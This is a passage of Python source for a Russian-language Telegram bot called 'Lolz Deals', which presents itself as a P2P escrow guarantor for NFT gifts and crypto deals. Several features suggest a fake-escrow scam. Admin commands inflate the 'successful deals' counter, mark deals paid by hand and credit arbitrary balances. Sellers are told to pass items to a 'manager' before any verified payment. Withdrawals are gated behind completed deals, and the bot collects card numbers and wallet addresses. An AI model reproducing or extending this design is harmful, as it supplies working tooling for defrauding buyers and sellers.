import os
import logging
import asyncio
import time
import re
import random
import string
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
from dotenv import load_dotenv
from aiohttp import web

load_dotenv()

TOKEN = os.getenv("BOT_TOKEN")
if not TOKEN:
    raise ValueError("BOT_TOKEN не задан в .env")

BANNER_URL = os.getenv("BANNER_URL", "https://i.ibb.co/KcVyKTVc/IMG-1682.jpg")

storage = MemoryStorage()
bot = Bot(token=TOKEN)
dp = Dispatcher(storage=storage)
logging.basicConfig(level=logging.INFO)

# ---------- Хранилище данных ----------
user_lang = {}
user_balance = {}
frozen_balance = {}
user_deals = {}
user_completed_deals = {}
withdraw_requests = []
user_last_message = {}
temp_admins = {}
logs = []
user_requisites = {}
global_deals = {}

# ---------- Премиум-эмодзи для текста ----------
EMOJI_TROPHY    = '<tg-emoji emoji-id="5893255507380014983">🏆</tg-emoji>'
EMOJI_LIGHTNING = '<tg-emoji emoji-id="5456140674028019486">⚡</tg-emoji>'
EMOJI_ROBOT     = '<tg-emoji emoji-id="5794164805065514131">🤖</tg-emoji>'
EMOJI_SHIELD    = '<tg-emoji emoji-id="5794085322400733645">🛡</tg-emoji>'
EMOJI_MONEY     = '<tg-emoji emoji-id="5794280000383358988">💰</tg-emoji>'
EMOJI_PACKAGE   = '<tg-emoji emoji-id="5794241397217304511">📦</tg-emoji>'
EMOJI_MEGAPHONE = '<tg-emoji emoji-id="5893290369629556374">📢</tg-emoji>'
EMOJI_GLOSSARY  = '<tg-emoji emoji-id="5893255507380014983">📖</tg-emoji>'
EMOJI_PIN       = '<tg-emoji emoji-id="5253961389285845297">📌</tg-emoji>'
EMOJI_DIAMOND   = '<tg-emoji emoji-id="5377620962390857342">💎</tg-emoji>'
EMOJI_CARD      = '<tg-emoji emoji-id="5445353829304387411">💳</tg-emoji>'
EMOJI_STAR      = '<tg-emoji emoji-id="5438496463044752972">⭐️</tg-emoji>'
EMOJI_COIN      = '<tg-emoji emoji-id="5379773896352355687">🪙</tg-emoji>'
EMOJI_ROCKET    = '<tg-emoji emoji-id="5195033767969839232">🚀</tg-emoji>'

# ID для премиум-эмодзи в кнопках
CUSTOM_EMOJI_BALANCE    = "6041730074376410123"
CUSTOM_EMOJI_DEALS      = "5417924076503062111"
CUSTOM_EMOJI_REFERRALS  = "5357080225463149588"   # 🤝
CUSTOM_EMOJI_CREATE     = "6084717714847306634"   # 📌
CUSTOM_EMOJI_LANG       = "5197269100878907942"
CUSTOM_EMOJI_REQUISITES = "6084717714847306634"
CUSTOM_EMOJI_SUPPORT    = "5447410659077661506"
CUSTOM_EMOJI_COPY       = "6084717714847306634"
CUSTOM_EMOJI_BACK       = "5197269100878907942"
CUSTOM_EMOJI_SEARCH     = "6084717714847306634"
CUSTOM_EMOJI_WITHDRAW   = "6041730074376410123"
CUSTOM_EMOJI_TRANSACT   = "5794241397217304511"
CUSTOM_EMOJI_TON        = "5377620962390857342"
CUSTOM_EMOJI_CARD_BTN   = "5445353829304387411"
CUSTOM_EMOJI_STARS_BTN  = "5897792062291449826"
CUSTOM_EMOJI_USDT       = "5794280000383358988"
CUSTOM_EMOJI_BTC        = "5379773896352355687"
CUSTOM_EMOJI_ROCKET     = "5195033767969839232"
CUSTOM_EMOJI_GIFT       = "5893255507380014983"

# ---------- FSM ----------
class CreateDealStates(StatesGroup):
    role = State()
    payment_method = State()
    currency = State()
    amount = State()
    description = State()
    confirm = State()

class RequisitesEdit(StatesGroup):
    waiting_ton = State()
    waiting_card = State()
    waiting_stars = State()
    waiting_usdt = State()
    waiting_btc = State()

class WithdrawForm(StatesGroup):
    waiting_requisites = State()
    waiting_amount = State()

class AdminReply(StatesGroup):
    waiting_message = State()

# ---------- Работа с реквизитами ----------
def get_user_requisites(user_id: int):
    return user_requisites.get(user_id, {
        'ton': '—',
        'card': '—',
        'stars': '—',
        'usdt': '—',
        'btc': '—'
    })

def save_user_requisites(user_id: int, data: dict):
    if user_id not in user_requisites:
        user_requisites[user_id] = {}
    user_requisites[user_id].update(data)

def validate_ton(value: str) -> bool:
    return len(value.strip()) > 5

def validate_card(value: str) -> bool:
    return bool(re.fullmatch(r'\d{16}', value.strip()))

def validate_stars(value: str) -> bool:
    return bool(re.fullmatch(r'@[\w_]+', value.strip()))

def validate_usdt(value: str) -> bool:
    return bool(re.fullmatch(r'T[1-9A-HJ-NP-Za-km-z]{33}', value.strip()))

def validate_btc(value: str) -> bool:
    return len(value.strip()) > 25

def generate_deal_code():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8))

# ---------- Тексты ----------
REF_LINK_TEMPLATE = "https://t.me/lolzgaranterbot?start=ref_{user_id}"  # исправлено: {code} -> {user_id}

TEXTS = {
    'ru': {
        'welcome': (
            f"<b>{EMOJI_TROPHY} Добро пожаловать в Lolz Deals</b>\n\n"
            f"<blockquote><b>{EMOJI_ROBOT} Ваш надёжный P2P-гарант:</b>\n"
            f"— <b>Автоматические сделки</b> с NFT и валютами\n"
            f"— {EMOJI_SHIELD} <b>Полная защита</b> обеих сторон\n"
            f"— {EMOJI_MONEY} <b>Реферальная программа</b> — <i>50% от комиссии</i>\n"
            f"— {EMOJI_PACKAGE} <b>Передача товаров</b> через менеджера: @LZSupp</blockquote>\n\n"
            f"{EMOJI_MEGAPHONE} <b>Канал:</b> @LiveLolz"
        ),
        'lang_prompt': f"<b>{EMOJI_GLOSSARY} Выберите язык:</b>",
        'lang_ru': "Русский",
        'lang_en': "English",
        'referral': (
            f"<b>{EMOJI_MONEY} Реферальная программа</b>\n\n"
            f"<blockquote><b>Ваша ссылка:</b>\n"
            f"<code>{REF_LINK_TEMPLATE}</code>\n"
            f"<b>Рефералов:</b> 0\n"
            f"<b>Заработано:</b> 0.0 TON</blockquote>\n\n"
            f"<b>Бонус:</b> 50% от комиссии с каждой сделки реферала!"
        ),
        'copy_btn': "Скопировать реф. ссылку",
        'back_btn': "Назад в меню",
        'balance': "Баланс",
        'deals': "Мои сделки",
        'referrals_btn': "Рефералы",
        'lang_btn': "Язык / Lang",
        'requisites': "Мои реквизиты",
        'create': "Создать сделку",
        'support': "Техподдержка",
        'deals_title': "Мои сделки",
        'deals_stats': f"Всего: {{total}} {EMOJI_TROPHY} Завершено: {{completed}} {EMOJI_PACKAGE}",
        'deals_list_empty': "У вас пока нет сделок.",
        'search_btn': "Поиск по коду",
        'search_prompt': "Введите код сделки (например, Yi4qbQ98):",
        'deal_not_found': "Сделка с кодом {code} не найдена.",
        'deal_details': (
            "<b>Детали сделки #{code}</b>\n\n"
            "Покупатель: @{buyer}\n"
            "Продавец: @{seller}\n"
            "Сумма: {amount} {currency}\n"
            "Время: {time}\n"
            "Дата: {date}"
        ),
        'balance_title': f"{EMOJI_MONEY} <b>Ваш баланс:</b>",
        'balance_empty': "Ваш баланс пока пуст",
        'balance_amount': "Ваш баланс: {{amount}} TON",
        'frozen_amount': "Заморожено: {{amount}} TON",
        'completed_deals': "Завершённых сделок: {{completed}}",
        'withdraw_need': "Для вывода средств необходимо минимум 2 завершённых сделки",
        'withdraw_btn': "Вывод средств",
        'transactions_btn': "Транзакции",
        'transactions_empty': "История транзакций пуста.",
        'withdraw_form_requisites': "Введите ваши реквизиты для вывода (кошелёк, карта и т.п.):",
        'withdraw_form_amount': "Введите сумму для вывода (доступно {{amount}} TON):",
        'withdraw_too_much': "Сумма превышает доступный баланс.",
        'withdraw_success': f"{EMOJI_MONEY} Заявка на вывод {{amount}} TON отправлена! Ожидайте подтверждения администратора.",
        'withdraw_fail': "Ошибка при создании заявки. Попробуйте позже.",
        'admin_panel': (
            f"{EMOJI_SHIELD} <b>Админ-панель</b>\n\n"
            f"{EMOJI_ROBOT} <b>Доступные команды:</b>\n"
            f"/hyteam — показать эту панель\n"
            f"/vvteam — заявки на вывод\n"
            f"/chat [@user или id] [текст] — ответить пользователю\n"
            f"/hostlebuy [код] — отметить оплату сделки\n"
            f"/ref [код] — уведомить о проблеме с подарком\n"
            f"/boost_success [число] — увеличить счётчик успешных сделок\n"
            f"/giveadmin [@user или id] [время] — выдать админку (1m,1h,1d,1w,1M,1y)\n"
            f"/addbalance [id] [сумма] — начислить баланс\n"
            f"/logs — просмотр логов"
        ),
        'admin_no_access': f"{EMOJI_SHIELD} У вас нет доступа к этой команде.",
        'admin_withdraw_list': "Заявки на вывод:\n{list}",
        'admin_withdraw_empty': "Нет активных заявок на вывод.",
        'admin_withdraw_confirm': f"{EMOJI_MONEY} Заявка на вывод {{amount}} TON для пользователя {{user}} подтверждена!",
        'admin_withdraw_error': "Ошибка подтверждения.",
        'chat_success': "Сообщение отправлено пользователю.",
        'chat_fail': "Не удалось отправить сообщение.",
        'chat_no_deal': "У вас нет сделок с этим пользователем.",
        'chat_not_first': "Пользователь не писал в поддержку.",
        'chat_limit': "Превышен лимит сообщений для этой сделки (макс. 10).",
        'hostlebuy_success': f"{EMOJI_MONEY} Сделка {{code}} отмечена как оплаченная, уведомления отправлены.",
        'hostlebuy_fail': "Сделка не найдена или уже оплачена.",
        'ref_success': f"{EMOJI_MEGAPHONE} Уведомление о проблеме с подарком отправлено участникам сделки {{code}}.",
        'ref_fail': "Сделка не найдена или неактивна.",
        'boost_success': f"{EMOJI_TROPHY} Счётчик успешных сделок увеличен на {{num}}.",
        'boost_fail': "Введите число.",
        'giveadmin_success': f"{EMOJI_SHIELD} Пользователь {{user}} получил права администратора на {{time_str}}.",
        'giveadmin_fail': "Некорректный формат времени. Используйте: 1m, 1h, 1d, 1w, 1M, 1y",
        'addbalance_success': f"{EMOJI_MONEY} Пользователю {{user}} начислено {{amount}} TON. Новый баланс: {{new_balance}} TON.",
        'addbalance_fail': "Неверный формат. Используйте: /addbalance [id] [сумма]",
        'addbalance_user_not_found': "Пользователь с ID {user} не найден.",
        'logs_header': f"{EMOJI_GLOSSARY} Логи действий:\n\n",
        'logs_empty': "Логов пока нет.",
        'logs_entry': "{{time}} | {{user}} | {{action}} | {{data}}",
        'support_contact': f"{EMOJI_SHIELD} Техподдержка\n\nСвяжитесь с нашим менеджером:\n@boyfrer",
        'requisites_title': f"{EMOJI_PIN} <b>Мои реквизиты</b>",
        'requisites_body': (
            f"<blockquote>{EMOJI_DIAMOND} <b>TON-кошелёк:</b>\n"
            f"<code>{{ton}}</code>\n\n"
            f"{EMOJI_CARD} <b>Карта:</b>\n"
            f"<code>{{card}}</code>\n\n"
            f"{EMOJI_STAR} <b>Stars:</b>\n"
            f"<code>{{stars}}</code>\n\n"
            f"{EMOJI_MONEY} <b>USDT (TRC20):</b>\n"
            f"<code>{{usdt}}</code>\n\n"
            f"{EMOJI_COIN} <b>BTC:</b>\n"
            f"<code>{{btc}}</code></blockquote>"
        ),
        'requisites_buttons': {
            'ton': "TON-кошелёк",
            'card': "Карта",
            'stars': "Stars",
            'usdt': "USDT-кошелёк",
            'btc': "BTC-кошелёк"
        },
        'requisites_edit_prompt': "Введите новый {field}:",
        'requisites_edit_invalid': "Некорректный формат. Попробуйте снова.",
        'requisites_edit_success': "✅ Данные обновлены!",
        # ---------- Создание сделки ----------
        'create_role': (
            f"<b>{EMOJI_TROPHY} Новая сделка</b>\n\n"
            f"Кем вы выступаете в этой сделке?\n\n"
            f"<b>{EMOJI_ROBOT} Продавец</b> — вы продаёте товар/услугу и получаете оплату.\n"
            f"<b>{EMOJI_MONEY} Покупатель</b> — вы платите и получаете товар/услугу."
        ),
        'create_payment': (
            f"<b>{EMOJI_TROPHY} Способ оплаты:</b>\n\n"
            f"Каким способом вы хотите оплатить?"
        ),
        'create_currency': (
            f"<b>{EMOJI_TROPHY} Выберите валюту карты:</b>"
        ),
        'create_amount': f"<b>{EMOJI_MONEY} Введите сумму в {{currency}}:</b>",
        'create_description': (
            f"<b>{EMOJI_PIN} Опишите предмет сделки:</b>\n\n"
            f"<blockquote>\n"
            f"Добавьте значение сделки или прямую ссылку на NFT/подарок.\n"
            f"Например: <code>https://t.me/nft/PlushPepe-111</code>\n"
            f"или просто текстовое описание товара.\n"
            f"</blockquote>\n\n"
            f"<b>Telegram</b>\n"
            f"<b>Plush Pepe #111</b>\n\n"
        ),
        'create_confirm_buyer': (
            f"<b>{EMOJI_TROPHY} Детали сделки (покупатель)</b>\n\n"
            f"<blockquote>\n"
            f"<b>{EMOJI_MONEY} Валюта:</b> {{currency}}\n"
            f"<b>{EMOJI_PACKAGE} Сумма:</b> {{amount}} {{currency_symbol}}\n"
            f"<b>{EMOJI_PIN} Описание:</b> {{description}}\n"
            f"</blockquote>\n\n"
            f"{EMOJI_LIGHTNING} <b>Ссылка для продавца:</b>\n"
            f"<code>{{link}}</code>\n\n"
            f"Или пригласите через инлайн: введите @[email protected] любом чате\n\n"
            f"<b>Telegram</b>\n"
            f"<b>{{description}}</b>\n\n"
            f"{EMOJI_ROCKET} Ожидайте подключения продавца."
        ),
        'create_confirm_seller': (
            f"<b>{EMOJI_TROPHY} Детали сделки (продавец)</b>\n\n"
            f"<blockquote>\n"
            f"<b>{EMOJI_MONEY} Валюта:</b> {{currency}}\n"
            f"<b>{EMOJI_PACKAGE} Сумма:</b> {{amount}} {{currency_symbol}}\n"
            f"<b>{EMOJI_PIN} Описание:</b> {{description}}\n"
            f"</blockquote>\n\n"
            f"{EMOJI_LIGHTNING} <b>Ссылка для покупателя:</b>\n"
            f"<code>{{link}}</code>\n\n"
            f"Или пригласите через инлайн: введите @[email protected] любом чате\n\n"
            f"<b>Telegram</b>\n"
            f"<b>{{description}}</b>\n\n"
            f"{EMOJI_ROCKET} Ожидайте подключения покупателя."
        ),
        'deal_created_buyer': (
            f"<b>{EMOJI_TROPHY} Вы подключились к сделке {{code}} как покупатель.</b>\n\n"
            f"<blockquote>\n"
            f"• <b>Покупатель:</b> ID {{buyer_id}}, сделок: {{buyer_deals}}\n"
            f"• <b>Описание:</b> {{description}}\n"
            f"• <b>Валюта:</b> {{currency}}\n"
            f"• <b>Сумма:</b> {{amount}}\n"
            f"• <b>Реквизиты менеджера:</b> {{manager_requisites}}\n"
            f"</blockquote>\n\n"
            f"{EMOJI_SHIELD} Вся оплата и передача товара проходит ТОЛЬКО через менеджера\n\n"
            f"После подтверждения оплаты покупателем — передайте товар менеджеру.\n\n"
            f"<b>Telegram</b>\n"
            f"{{description}}"
        ),
        'deal_created_seller': (
            f"<b>{EMOJI_TROPHY} К сделке #{{code}} присоединился продавец</b>\n\n"
            f"<blockquote>\n"
            f"Реквизиты менеджера для оплаты: {{manager_requisites}}\n"
            f"Завершённых сделок у продавца: {{seller_deals}}\n"
            f"</blockquote>\n\n"
            f"{EMOJI_SHIELD} Вся оплата проходит ТОЛЬКО через менеджера @Iank. Не переводите средства напрямую продавцу!\n"
            f"Проверьте реквизиты перед оплатой!\n\n"
            f"Оплатить с баланса ({{balance}} {{currency}})\n\n"
            f"После оплаты нажмите «Я передал подарок»."
        ),
        'deal_completed': (
            f"<b>{EMOJI_TROPHY} Сделка #{{code}} завершена!</b>\n\n"
            f"{EMOJI_MEGAPHONE} Спасибо за проведение сделки в нашем боте. Мы очень дорожим безопасностью наших покупателей и продавцов."
        ),
        'deal_cancelled': "Сделка отменена.",
        'gift_sent_seller': (
            f"{EMOJI_PACKAGE} Вы отправили подарок по сделке #{{code}}. Ожидайте подтверждения от администратора."
        ),
        'gift_sent_admin': (
            f"{EMOJI_MEGAPHONE} <b>Продавец сообщил о передаче подарка по сделке #{{code}}</b>\n\n"
            f"<blockquote>\n"
            f"Покупатель: @{{buyer}}\n"
            f"Продавец: @{{seller}}\n"
            f"Сумма: {{amount}} {{currency}}\n"
            f"Описание: {{description}}\n"
            f"</blockquote>\n\n"
            f"Проверьте, что подарок действительно передан, свяжитесь с покупателем."
        ),
        'gift_confirm_admin': (
            f"{EMOJI_SHIELD} <b>Подтверждение передачи подарка по сделке #{{code}}</b>\n\n"
            f"Вы подтвердили, что подарок передан. Покупатель и продавец будут уведомлены."
        ),
        'gift_reject_admin': (
            f"{EMOJI_SHIELD} <b>Отказ в передаче подарка по сделке #{{code}}</b>\n\n"
            f"Вы отправили сообщение продавцу: «{{message}}»"
        ),
        'gift_confirm_buyer': (
            f"{EMOJI_TROPHY} Подарок по сделке #{{code}} подтверждён администратором. Сделка завершена."
        ),
        'gift_reject_seller': (
            f"{EMOJI_SHIELD} Администратор сообщил: «{{message}}». Пожалуйста, свяжитесь с поддержкой."
        ),
    },
    'en': {}
}

# ---------- Вспомогательные функции ----------
def get_text(user_id: int, key: str) -> str:
    lang = user_lang.get(user_id, 'ru')
    return TEXTS[lang].get(key, TEXTS['ru'][key])

def get_ref_link(user_id: int) -> str:
    return REF_LINK_TEMPLATE.format(user_id=user_id)   # теперь подставляется user_id

def get_user_balance(user_id: int) -> float:
    return user_balance.get(user_id, 0.0)

def get_frozen_balance(user_id: int) -> float:
    return frozen_balance.get(user_id, 0.0)

def get_user_completed_deals(user_id: int) -> int:
    return user_completed_deals.get(user_id, 0)

def is_admin(user_id: int) -> bool:
    if user_id == ADMIN_ID:
        return True
    if user_id in temp_admins and temp_admins[user_id] > time.time():
        return True
    return False

def log_action(user_id: int, action: str, data: str = "", ip: str = ""):
    logs.append({
        'time': datetime.now().isoformat(),
        'user': user_id,
        'action': action,
        'data': data,
        'ip': ip
    })
    if len(logs) > 1000:
        logs.pop(0)

# ---------- Удаление предыдущего сообщения ----------
async def delete_previous(user_id: int, chat_id: int):
    if user_id in user_last_message:
        try:
            await bot.delete_message(chat_id, user_last_message[user_id])
        except:
            pass
        del user_last_message[user_id]

async def send_with_banner(target, text, keyboard=None, parse_mode="HTML"):
    user_id = target.from_user.id if hasattr(target, 'from_user') else target.chat.id
    chat_id = target.chat.id if hasattr(target, 'chat') else target.message.chat.id
    await delete_previous(user_id, chat_id)
    try:
        if isinstance(target, types.Message):
            msg = await target.answer_photo(photo=BANNER_URL, caption=text, parse_mode=parse_mode, reply_markup=keyboard)
        else:
            msg = await target.message.answer_photo(photo=BANNER_URL, caption=text, parse_mode=parse_mode, reply_markup=keyboard)
        user_last_message[user_id] = msg.message_id
    except Exception as e:
        logging.error(f"Ошибка отправки баннера: {e}")
        if isinstance(target, types.Message):
            msg = await target.answer(text, parse_mode="HTML", reply_markup=keyboard)
        else:
            msg = await target.message.answer(text, parse_mode="HTML", reply_markup=keyboard)
        user_last_message[user_id] = msg.message_id

async def send_main_menu(target, user_id: int):
    text = get_text(user_id, 'welcome')
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text=get_text(user_id, 'balance'), icon_custom_emoji_id=CUSTOM_EMOJI_BALANCE, callback_data="balance"),
            InlineKeyboardButton(text=get_text(user_id, 'deals'), icon_custom_emoji_id=CUSTOM_EMOJI_DEALS, callback_data="deals")
        ],
        [
            InlineKeyboardButton(text=get_text(user_id, 'referrals_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_REFERRALS, callback_data="ref"),
            InlineKeyboardButton(text=get_text(user_id, 'lang_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_LANG, callback_data="lang")
        ],
        [
            InlineKeyboardButton(text=get_text(user_id, 'requisites'), icon_custom_emoji_id=CUSTOM_EMOJI_REQUISITES, callback_data="requisites"),
            InlineKeyboardButton(text=get_text(user_id, 'create'), icon_custom_emoji_id=CUSTOM_EMOJI_CREATE, callback_data="new_deal")
        ],
        [
            InlineKeyboardButton(text=get_text(user_id, 'support'), icon_custom_emoji_id=CUSTOM_EMOJI_SUPPORT, callback_data="support")
        ]
    ])
    await send_with_banner(target, text, keyboard)

# ---------- Команда /start ----------
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    if user_id not in user_lang:
        user_lang[user_id] = 'ru'
    args = message.text.split()
    if len(args) > 1 and args[1].startswith('deal_'):
        code = args[1][5:]
        await join_deal(message, user_id, code)
        return
    await send_main_menu(message, user_id)
    log_action(user_id, "start", "запуск бота")

# ============================================================
# ОСНОВНЫЕ ОБРАБОТЧИКИ
# ============================================================

# ---------- Рефералы (callback_data="ref") ----------
@dp.callback_query(lambda c: c.data == "ref")
async def cb_referrals(callback: types.CallbackQuery):
    logging.info("✅ Обработчик ref (рефералы) вызван")
    user_id = callback.from_user.id
    ref_text = get_text(user_id, 'referral')
    ref_link = get_ref_link(user_id)   # теперь возвращает ссылку с user_id
    ref_text = ref_text.replace(REF_LINK_TEMPLATE, ref_link)
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=get_text(user_id, 'copy_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_COPY, callback_data="copy_ref")],
        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
    ])
    await send_with_banner(callback, ref_text, keyboard)
    await callback.answer()
    log_action(user_id, "referrals", "просмотр рефералов")

# ---------- Создать сделку (callback_data="new_deal") ----------
@dp.callback_query(lambda c: c.data == "new_deal")
async def cb_create(callback: types.CallbackQuery, state: FSMContext):
    logging.info("✅ Обработчик new_deal (создать сделку) вызван")
    user_id = callback.from_user.id
    await state.set_state(CreateDealStates.role)
    text = get_text(user_id, 'create_role')
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Я продавец", icon_custom_emoji_id=CUSTOM_EMOJI_ROCKET, callback_data="role_seller")],
        [InlineKeyboardButton(text="Я покупатель", icon_custom_emoji_id=CUSTOM_EMOJI_MONEY, callback_data="role_buyer")],
        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
    ])
    await send_with_banner(callback, text, keyboard)
    await callback.answer()

# ---------- Баланс ----------
@dp.callback_query(lambda c: c.data == "balance")
async def cb_balance(callback: types.CallbackQuery):
    logging.info("✅ Обработчик balance вызван")
    user_id = callback.from_user.id
    balance = get_user_balance(user_id)
    frozen = get_frozen_balance(user_id)
    completed = get_user_completed_deals(user_id)
    if balance == 0 and frozen == 0:
        balance_text = get_text(user_id, 'balance_empty')
    else:
        balance_text = get_text(user_id, 'balance_amount').format(amount=balance)
    frozen_text = ""
    if frozen > 0:
        frozen_text = get_text(user_id, 'frozen_amount').format(amount=frozen) + "\n"
    text = (
        f"{get_text(user_id, 'balance_title')}\n\n"
        f"{balance_text}\n"
        f"{frozen_text}"
        f"{get_text(user_id, 'completed_deals').format(completed=completed)}\n\n"
        f"{get_text(user_id, 'withdraw_need')}"
    )
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=get_text(user_id, 'withdraw_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_WITHDRAW, callback_data="withdraw")],
        [InlineKeyboardButton(text=get_text(user_id, 'transactions_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_TRANSACT, callback_data="transactions")],
        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
    ])
    await send_with_banner(callback, text, keyboard)
    await callback.answer()
    log_action(user_id, "balance", "просмотр баланса")

# ---------- Мои сделки ----------
@dp.callback_query(lambda c: c.data == "deals")
async def cb_deals(callback: types.CallbackQuery):
    logging.info("✅ Обработчик deals вызван")
    user_id = callback.from_user.id
    deals = user_deals.get(user_id, [])
    total = len(deals)
    completed = sum(1 for d in deals if d.get('status') == 'completed')
    stats = get_text(user_id, 'deals_stats').format(total=total, completed=completed)
    text = f"<b>{get_text(user_id, 'deals_title')}</b>\n\n<blockquote>{stats}</blockquote>"
    if deals:
        items = []
        for d in deals[:5]:
            items.append(f"#{d['code']}")
        text += "\n" + "\n".join(items)
    else:
        text += "\n" + get_text(user_id, 'deals_list_empty')
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=get_text(user_id, 'search_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_SEARCH, callback_data="search_deal")],
        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
    ])
    await send_with_banner(callback, text, keyboard)
    await callback.answer()
    log_action(user_id, "deals", "просмотр сделок")

# ---------- Поиск сделки ----------
class DealSearch(StatesGroup):
    waiting_code = State()

@dp.callback_query(lambda c: c.data == "search_deal")
async def cb_search_deal(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    await callback.message.answer(get_text(user_id, 'search_prompt'))
    await state.set_state(DealSearch.waiting_code)
    await callback.answer()

@dp.message(DealSearch.waiting_code)
async def process_search_code(message: Message, state: FSMContext):
    user_id = message.from_user.id
    code = message.text.strip()
    deals = user_deals.get(user_id, [])
    deal = next((d for d in deals if d['code'] == code), None)
    if not deal:
        await message.answer(get_text(user_id, 'deal_not_found').format(code=code))
    else:
        details = get_text(user_id, 'deal_details').format(
            code=deal['code'],
            buyer=deal.get('buyer', 'unknown'),
            seller=deal.get('seller', 'unknown'),
            amount=deal.get('amount', 0),
            currency=deal.get('currency', 'TON'),
            time=deal.get('time', '12:00'),
            date=deal.get('date', '2026-01-01')
        )
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
        ])
        await send_with_banner(message, details, keyboard)
        log_action(user_id, "search_deal", f"код {code}")
    await state.clear()

# ---------- Мои реквизиты ----------
async def show_requisites(target, user_id: int):
    req = get_user_requisites(user_id)
    ton = req['ton']
    card = req['card']
    stars = req['stars']
    usdt = req['usdt']
    btc = req['btc']
    title = get_text(user_id, 'requisites_title')
    body = get_text(user_id, 'requisites_body').format(
        ton=ton, card=card, stars=stars, usdt=usdt, btc=btc
    )
    text = f"{title}\n\n{body}"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text=get_text(user_id, 'requisites_buttons')['ton'], icon_custom_emoji_id=CUSTOM_EMOJI_TON, callback_data="edit_ton"),
            InlineKeyboardButton(text=get_text(user_id, 'requisites_buttons')['card'], icon_custom_emoji_id=CUSTOM_EMOJI_CARD_BTN, callback_data="edit_card")
        ],
        [
            InlineKeyboardButton(text=get_text(user_id, 'requisites_buttons')['stars'], icon_custom_emoji_id=CUSTOM_EMOJI_STARS_BTN, callback_data="edit_stars"),
            InlineKeyboardButton(text=get_text(user_id, 'requisites_buttons')['usdt'], icon_custom_emoji_id=CUSTOM_EMOJI_USDT, callback_data="edit_usdt")
        ],
        [
            InlineKeyboardButton(text=get_text(user_id, 'requisites_buttons')['btc'], icon_custom_emoji_id=CUSTOM_EMOJI_BTC, callback_data="edit_btc")
        ],
        [
            InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")
        ]
    ])
    await send_with_banner(target, text, keyboard)

@dp.callback_query(lambda c: c.data == "requisites")
async def cb_requisites(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    await show_requisites(callback, user_id)
    await callback.answer()
    log_action(user_id, "requisites", "просмотр реквизитов")

# ---------- Редактирование реквизитов ----------
@dp.callback_query(lambda c: c.data == "edit_ton")
async def edit_ton(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    await state.set_state(RequisitesEdit.waiting_ton)
    await callback.message.answer(get_text(user_id, 'requisites_edit_prompt').format(field="TON-кошелёк"))
    await callback.answer()

@dp.callback_query(lambda c: c.data == "edit_card")
async def edit_card(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    await state.set_state(RequisitesEdit.waiting_card)
    await callback.message.answer(get_text(user_id, 'requisites_edit_prompt').format(field="карта (16 цифр)"))
    await callback.answer()

@dp.callback_query(lambda c: c.data == "edit_stars")
async def edit_stars(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    await state.set_state(RequisitesEdit.waiting_stars)
    await callback.message.answer(get_text(user_id, 'requisites_edit_prompt').format(field="Stars (@username)"))
    await callback.answer()

@dp.callback_query(lambda c: c.data == "edit_usdt")
async def edit_usdt(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    await state.set_state(RequisitesEdit.waiting_usdt)
    await callback.message.answer(get_text(user_id, 'requisites_edit_prompt').format(field="USDT (TRC20 адрес)"))
    await callback.answer()

@dp.callback_query(lambda c: c.data == "edit_btc")
async def edit_btc(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    await state.set_state(RequisitesEdit.waiting_btc)
    await callback.message.answer(get_text(user_id, 'requisites_edit_prompt').format(field="BTC-адрес"))
    await callback.answer()

@dp.message(RequisitesEdit.waiting_ton)
async def process_ton(message: Message, state: FSMContext):
    user_id = message.from_user.id
    value = message.text.strip()
    if not validate_ton(value):
        await message.answer(get_text(user_id, 'requisites_edit_invalid'))
        return
    save_user_requisites(user_id, {'ton': value})
    await state.clear()
    await message.answer(get_text(user_id, 'requisites_edit_success'))
    await asyncio.sleep(0.5)
    await show_requisites(message, user_id)
    log_action(user_id, "edit_requisites", f"ton обновлён")

@dp.message(RequisitesEdit.waiting_card)
async def process_card(message: Message, state: FSMContext):
    user_id = message.from_user.id
    value = message.text.strip()
    if not validate_card(value):
        await message.answer(get_text(user_id, 'requisites_edit_invalid'))
        return
    save_user_requisites(user_id, {'card': value})
    await state.clear()
    await message.answer(get_text(user_id, 'requisites_edit_success'))
    await asyncio.sleep(0.5)
    await show_requisites(message, user_id)
